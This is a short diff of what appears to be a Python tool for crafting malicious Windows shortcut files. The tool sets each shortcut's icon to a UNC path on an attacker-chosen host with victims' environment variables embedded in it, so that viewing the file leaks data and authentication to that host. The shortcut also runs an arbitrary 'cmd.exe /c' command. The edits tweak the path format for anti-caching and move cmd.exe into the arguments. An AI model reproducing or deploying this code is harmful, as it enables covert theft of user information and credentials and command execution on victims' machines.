@@ -100,9 +100,9 @@ def main(args):
         )
     else:
         args.vars = args.vars.replace('%', '').split(' ')
-        path = '\\'.join('%{0}%'.format(w) for w in args.vars)
+        path = '_'.join('%{0}%'.format(w) for w in args.vars)
         # Some minor anti-caching
-        icon = r'\\{host}\Share\{path}\{filename}.ico'.format(
+        icon = r'\\{host}\Share_{path}\{filename}.ico'.format(
             host=args.host,
             path=path,
             filename=random.randint(0, 50000)
@@ -111,8 +111,8 @@ def main(args):
     if is_windows:
         ws = win32com.client.Dispatch('wscript.shell')
         link = ws.CreateShortcut(args.output)
-        link.Targetpath = r'C:\Windows\System32\cmd.exe'
-        link.Arguments = '/c ' + target
+        link.Targetpath = r'C:\Windows\System32'
+        link.Arguments = 'cmd.exe /c ' + target
         link.IconLocation = icon
         link.save()
     else:
